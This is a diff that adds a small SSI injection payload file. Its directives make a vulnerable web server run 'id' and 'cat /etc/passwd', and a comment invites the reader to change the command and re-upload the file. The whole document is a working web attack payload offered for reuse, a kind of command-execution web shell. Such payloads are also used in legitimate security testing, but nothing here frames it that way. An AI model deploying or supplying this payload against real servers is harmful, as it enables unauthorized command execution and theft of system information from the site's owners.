@@ -1,0 +1,3 @@
+<!--#exec cmd="id" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!-- Usage: change cmd param above and re-upload -->
